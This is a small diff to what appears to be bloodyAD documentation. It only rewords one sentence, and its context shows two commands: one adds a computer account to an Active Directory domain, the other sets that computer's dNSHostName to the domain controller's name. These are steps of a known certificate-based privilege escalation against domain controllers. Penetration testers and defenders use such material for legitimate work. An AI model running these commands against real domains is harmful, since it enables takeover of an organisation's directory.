@@ -17,7 +17,7 @@ If it's okay, just add a computer with bloodyAD :
 ```bash
 python3 bloodyAD.py -d DOMAIN -u USERNAME -p PASSWORD --host DC_IP addComputer COMPUTER_NAME 'COMPUTER_PASSWORD'
 ```
-Then, set the dNSHostname attribute to match the domain controller dNSHostname attribute (for exemple DC.domain.local) :
+Then, set the dNSHostname attribute of your machine to match the domain controller one (for exemple DC.domain.local) :
 ```bash
 python3 bloodyAD.py -d DOMAIN -u USERNAME -p PASSWORD --host DC_IP setAttribute 'CN=COMPUTER_NAME,CN=Computers,DC=domain,DC=local' dNSHostName '["DC.domain.local"]'
 ```
